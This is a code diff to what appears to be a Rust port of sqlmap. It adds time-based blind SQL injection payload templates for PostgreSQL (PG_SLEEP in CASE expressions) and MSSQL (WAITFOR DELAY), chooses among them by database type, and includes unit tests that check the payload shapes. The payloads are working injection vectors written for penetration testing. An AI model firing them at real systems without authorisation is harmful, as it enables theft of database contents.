@@ -44,14 +44,41 @@ const STACKED_INFER: &str = ";SELECT SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPT
 const INLINE_INFER: &str =
     "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])";
 
-/// Pick the inference channel for an injection by its technique (sqlmap
-/// retrieves data through whichever technique confirmed the injection).
-pub fn infer_signal(technique: sqlmap_core::config::Technique) -> InferSignal {
+/// PostgreSQL vectors: no IF(), so the conditional sleep is a CASE; the
+/// pg_sleep() void result makes `IS NULL` pass so the predicate still holds.
+const PG_TIME_INFER: &str =
+    "AND [RANDNUM]=(SELECT [RANDNUM] WHERE (CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END) IS NULL)";
+const PG_STACKED_INFER: &str =
+    ";SELECT CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END-- ";
+const PG_INLINE_INFER: &str =
+    "(SELECT [RANDNUM] FROM (SELECT (CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END))[RANDSTR])";
+
+/// MSSQL vectors: WAITFOR DELAY is a statement, so the conditional delay
+/// rides the same `IF(...) WAITFOR` statement shape as the detection
+/// payloads in stacked_queries.xml / inline_query.xml.
+const MS_TIME_INFER: &str =
+    "AND [RANDNUM]=(SELECT [RANDNUM] WHERE 1=1 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]')";
+const MS_STACKED_INFER: &str = ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'-- ";
+const MS_INLINE_INFER: &str =
+    "(SELECT [RANDNUM] WHERE 1=1 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]')";
+
+/// Pick the inference channel for an injection by its technique and DBMS
+/// (sqlmap retrieves data through whichever technique confirmed the
+/// injection). Unknown/absent DBMS tags fall back to the MySQL vectors.
+pub fn infer_signal(technique: sqlmap_core::config::Technique, dbms: Option<&str>) -> InferSignal {
     use sqlmap_core::config::Technique as T;
+    let dbms = dbms
+        .and_then(crate::queries::Dbms::parse)
+        .unwrap_or(crate::queries::Dbms::MySql);
+    let (time, stacked, inline) = match dbms {
+        crate::queries::Dbms::PostgreSql => (PG_TIME_INFER, PG_STACKED_INFER, PG_INLINE_INFER),
+        crate::queries::Dbms::MsSql => (MS_TIME_INFER, MS_STACKED_INFER, MS_INLINE_INFER),
+        _ => (TIME_INFER, STACKED_INFER, INLINE_INFER),
+    };
     match technique {
-        T::Time => InferSignal::Delay { template: TIME_INFER, full_replace: false },
-        T::Stacked => InferSignal::Delay { template: STACKED_INFER, full_replace: false },
-        T::Inline => InferSignal::Delay { template: INLINE_INFER, full_replace: true },
+        T::Time => InferSignal::Delay { template: time, full_replace: false },
+        T::Stacked => InferSignal::Delay { template: stacked, full_replace: false },
+        T::Inline => InferSignal::Delay { template: inline, full_replace: true },
         _ => InferSignal::Page,
     }
 }
@@ -610,5 +637,42 @@ mod tests {
     fn hex_encodes_ascii() {
         assert_eq!(hex("shop"), "0x73686f70");
         assert_eq!(hex(""), "0x");
+    }
+
+    fn delay_template(technique: sqlmap_core::config::Technique, dbms: Option<&str>) -> String {
+        match infer_signal(technique, dbms) {
+            InferSignal::Delay { template, .. } => template.to_string(),
+            InferSignal::Page => panic!("expected a Delay signal"),
+        }
+    }
+
+    #[test]
+    fn infer_vectors_follow_technique_and_dbms() {
+        use sqlmap_core::config::Technique as T;
+
+        // MySQL (and the unknown/absent fallback) keeps the SLEEP/IF shape.
+        for dbms in [Some("mysql"), None, Some("oracle")] {
+            assert!(delay_template(T::Time, dbms).contains("SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))"));
+            assert!(delay_template(T::Stacked, dbms).starts_with(";SELECT SLEEP("));
+            assert!(delay_template(T::Inline, dbms).contains("SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))"));
+        }
+
+        // PostgreSQL: CASE-driven pg_sleep, no IF().
+        let pg_time = delay_template(T::Time, Some("postgresql"));
+        assert!(pg_time.contains("CASE WHEN ([INFERENCE]) THEN PG_SLEEP([SLEEPTIME]) ELSE PG_SLEEP(0) END"));
+        assert!(!pg_time.contains("IF("));
+        assert!(delay_template(T::Stacked, Some("postgresql")).starts_with(";SELECT CASE WHEN"));
+        assert!(delay_template(T::Inline, Some("pgsql")).contains("PG_SLEEP([SLEEPTIME])"));
+
+        // MSSQL: IF(...) WAITFOR DELAY statement shape, no SLEEP/CASE.
+        let ms_time = delay_template(T::Time, Some("mssql"));
+        assert!(ms_time.contains("IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'"));
+        assert!(!ms_time.contains("SLEEP("));
+        assert!(delay_template(T::Stacked, Some("mssql")).starts_with(";IF([INFERENCE]) WAITFOR"));
+        assert!(delay_template(T::Inline, Some("Microsoft SQL Server")).contains("WAITFOR DELAY"));
+
+        // Non-delay techniques keep the page-comparison signal.
+        assert!(matches!(infer_signal(T::Boolean, Some("mssql")), InferSignal::Page));
+        assert!(matches!(infer_signal(T::Union, None), InferSignal::Page));
     }
 }
